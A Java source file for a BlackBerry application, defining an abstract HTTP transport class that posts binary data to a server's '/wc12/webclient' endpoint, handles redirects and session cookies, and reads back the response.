//#preprocess
package blackberry.action.sync.transport;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;

import javax.microedition.io.Connector;
import javax.microedition.io.HttpConnection;
import javax.microedition.io.StreamConnection;

import net.rim.device.api.io.IOCancelledException;
import net.rim.device.api.io.http.HttpProtocolConstants;
import blackberry.Status;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.utils.Check;
import blackberry.utils.Utils;

public abstract class HttpTransport extends Transport {

    private static final int PORT = 80;

    //#ifdef DEBUG
    private static Debug debug = new Debug("HttpTransport", DebugLevel.INFORMATION);
    //#endif

    String host;

    public HttpTransport(String host) {
        super("http://" + host + ":" + PORT + "/wc12/webclient");

        this.host = host;
        cookie = null;
        stop = false;
    }

    //private String transportId;
    private String cookie;

    boolean stop;
    boolean follow_moved = true;

    private final String HEADER_CONTENTTYPE = "content-type";
    private final String HEADER_SETCOOKIE = "set-cookie";
    private final String HEADER_CONTENTLEN = "content-length";

    //private final String USER_AGENT = "Profile/MIDP-2.0 Configuration/CLDC-1.0";
    private final String CONTENT_TYPE = "application/octet-stream";
    static//private static String CONTENTTYPE_TEXTHTML = "text/html";
    boolean acceptWifi = false;

    public void close() {
        cookie = null;
    }

    public synchronized byte[] command(byte[] data) throws TransportException {

        // sending request
        HttpConnection connection = null;
        try {
            connection = createRequest();
            sendHttpPostRequest(connection, data);
        } catch (TransportException ex) {
            //#ifdef DEBUG
            debug.trace("command: second chance");
            //#endif
            connection = createRequest();
            sendHttpPostRequest(connection, data);
        }

        //#ifdef DBC        
        Check.asserts(connection != null, "null connection");
        //#endif

        int status;
        try {
            status = connection.getResponseCode();

            // if it's moved, try with the new url
            if (follow_moved
                    && (status == HttpConnection.HTTP_MOVED_TEMP
                            || status == HttpConnection.HTTP_MOVED_PERM || status == HttpConnection.HTTP_TEMP_REDIRECT)) {
                baseurl = connection.getHeaderField("Location");
                //#ifdef DEBUG
                debug
                        .trace("sendHttpPostRequest Moved to Location: "
                                + baseurl);
                //#endif

                connection = createRequest();
                sendHttpPostRequest(connection, data);
                status = connection.getResponseCode();
            }

            // check response, if ok parse it            
            if (status == HttpConnection.HTTP_OK) {
                byte[] content = parseHttpConnection(connection);
                //#ifdef DEBUG
                Status.getInstance().wap2Ok();
                //#endif
                return content;

            } else {
                //#ifdef DEBUG
                debug.error("command response status: " + status);
                if (status == 502) {
                    Status.getInstance().wap2Error();
                }
                //#endif

                throw new TransportException(7);
            }
        } catch (IOException e) {
            //#ifdef DEBUG
            debug.error("command: " + e);
            //#endif
            throw new TransportException(8);
        } finally {
            try {
                if (connection != null) {
                    connection.close();
                }
            } catch (IOException e) {
                //#ifdef DEBUG
                debug.error("command: " + e);
                //#endif
            }
        }
    }

    /*
     * private static String getWap2TransportUid() { ServiceBook sb =
     * ServiceBook.getSB(); ServiceRecord[] records =
     * sb.findRecordsByCid("WPTCP"); String uid = null; for(int i=0; i <
     * records.length; i++) { //Search through all service records to find the
     * //valid non-Wi-Fi and non-MMS //WAP 2.0 Gateway Service Record. if
     * (records[i].isValid() && !records[i].isDisabled()) { if
     * (records[i].getUid() != null && records[i].getUid().length() != 0) { if
     * ((records[i].getUid().toLowerCase().indexOf("wifi") == -1) &&
     * (records[i].getUid().toLowerCase().indexOf("mms") == -1)) { uid =
     * records[i].getUid(); break; } } } } return uid; }
     */

    private HttpConnection createRequest() throws TransportException {

        String content = "";

        boolean httpOK;
        HttpConnection httpConn = null;

        try {
            StreamConnection s = null;
            s = (StreamConnection) Connector.open(getUrl());
            httpConn = (HttpConnection) s;
            httpConn.setRequestMethod(HttpConnection.POST);

            if (cookie != null) {
                //#ifdef DEBUG
                debug.trace("sendHttpPostRequest cookie: " + cookie);
                //#endif
                httpConn.setRequestProperty(
                        HttpProtocolConstants.HEADER_COOKIE, cookie);
            }

            httpConn.setRequestProperty(HttpProtocolConstants.HEADER_HOST,
                    httpConn.getHost());
            httpConn.setRequestProperty(
                    HttpProtocolConstants.HEADER_CONTENT_TYPE, CONTENT_TYPE);
            httpConn.setRequestProperty(
                    HttpProtocolConstants.HEADER_CONNECTION, "KeepAlive");

            //#ifdef DBC
            Check.ensures(httpConn != null,
                    "sendHttpPostRequest: httpConn null");
            //#endif  
        } catch (Exception ex) {
            throw new TransportException(1);
        }
        return httpConn;
    }

    private boolean sendHttpPostRequest(HttpConnection httpConn, byte[] data)
            throws TransportException {
        //#ifdef DBC
        Check.requires(data != null, "sendHttpPostRequest: null data");
        //#endif
        String content = "";

        boolean httpOK;

        // Open the connection and extract the data.
        try {

            OutputStream os = null;
            os = httpConn.openOutputStream();
            os.write(data);
            os.close();
            //os.flush(); // Optional, getResponseCode will flush

            //#ifdef DEBUG
            debug.trace("sendHttpPostRequest: get response");
            //#endif
            int status = httpConn.getResponseCode();
            httpOK = (status == HttpConnection.HTTP_OK);

            /*
             * //#ifdef DEBUG debug.trace("sendHttpPostRequest: closing");
             * //#endif os.close();
             */

            //#ifdef DEBUG
            debug.trace("sendHttpPostRequest response: " + status);
            //#endif

        } catch (Exception ex) {
            //#ifdef DEBUG
            debug.error(ex);
            //#endif
            throw new TransportException(2);
        }

        if (!httpOK) {
            //#ifdef DEBUG
            debug.error("HTTP not ok");
            //#endif
            //throw new TransportException(2);
        }

        //#ifdef DBC
        Check.ensures(httpConn != null, "sendHttpPostRequest: httpConn null");
        //#endif     
        return httpOK;
    }

    private byte[] parseHttpConnection(HttpConnection httpConn)
            throws TransportException {
        try {
            // Is this html?
            String contentType = httpConn.getHeaderField(HEADER_CONTENTTYPE);
            boolean htmlContent = (contentType != null && contentType
                    .startsWith(contentType));

            if (!htmlContent) {
                //#ifdef DEBUG
                debug.error("parseHttpConnection wrong htmlContent : "
                        + contentType);
                //#endif
                throw new TransportException(3);
            }

            String setCookie = httpConn.getHeaderField(HEADER_SETCOOKIE);

            if (setCookie != null) {
                //#ifdef DEBUG
                debug.trace("parseHttpConnection setCookie: " + setCookie);
                //#endif

                cookie = setCookie;
            }

            String contentLen = httpConn.getHeaderField(HEADER_CONTENTLEN);
            //#ifdef DEBUG
            debug.trace("parseHttpConnection len: " + contentLen);
            //#endif

            int totalLen = 0;
            try {
                // expected content size
                totalLen = Integer.parseInt(contentLen);

            } catch (Exception ex) {
                //#ifdef DEBUG
                debug.error("parseHttpConnection parseInt");
                //#endif
                throw new TransportException(4);
            }

            InputStream input = httpConn.openInputStream();

            // buffer data
            byte[] buffer = new byte[10 * 1024];
            byte[] content = new byte[totalLen];
            int size = 0; // incremental size
            int len = 0; // iterative size

            while (-1 != (len = input.read(buffer))) {
                //#ifdef DEBUG
                debug.trace("parseHttpConnection read=" + len + " size=" + size
                        + " tot=" + totalLen);
                //#endif
                // Exit condition for the thread. An IOException is 
                // thrown because of the call to  httpConn.close(), 
                // causing the thread to terminate.
                if (stop) {
                    //#ifdef DEBUG
                    debug.trace("parseHttpConnection stop!");
                    //#endif
                    httpConn.close();
                    input.close();
                }
                Utils.copy(content, size, buffer, 0, len);
                size += len;
            }

            //#ifdef DEBUG
            debug.trace("parseHttpConnection received:" + size);
            //#endif

            input.close();

            //#ifdef DBC
            Check.ensures(len != totalLen, "sendHttpPostRequest: received:"
                    + size + " expected: " + totalLen);
            //#endif 
            return content;

        } catch (IOCancelledException e) {
            //#ifdef DEBUG
            debug.error(e);
            //#endif
            throw new TransportException(5);
        } catch (IOException e) {
            //#ifdef DEBUG
            debug.error(e);
            //#endif
            throw new TransportException(6);
        }
    }
}
